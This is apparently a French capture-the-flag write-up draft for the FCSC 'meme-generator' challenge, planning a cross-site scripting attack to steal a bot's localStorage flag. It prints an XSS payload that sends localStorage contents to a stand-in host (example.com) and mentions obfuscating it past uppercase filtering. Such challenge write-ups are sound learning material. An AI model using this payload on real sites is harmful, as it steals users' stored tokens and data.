# Analyse
- Application web : https://meme-generator.fcsc.fr/

Il est indiqué que le bot accessible possède le flag dans son localStorage.

On va alors essayer de faire une attaque XSS via le formulaire de création de meme.

## XSS

- On récupère tous les éléments du localStorage et on les envoie à l'URL de notre choix.

```html
<script>
    document.location.href = 'https://example.com/'+JSON.stringify(localStorage);
</script>
```

Problème : Le contenu de ce qu'on envoie lors de la requête pour le XSS est réécris en majuscules. Donc les mots clés ( tels que `document` etc...) ne sont plus reconnus...

> On pourrait alors essayer de faire une obfuscation pour que la casse n'impacte pas le bon fonctionnement du script ???

### Utilisation du bot 

Une fois cette solution trouvée, on pourra simplement utiliser le bot pour faire la requête vers le site avec notre injection XSS

```zsh
nc chall.fcsc.fr 2210
```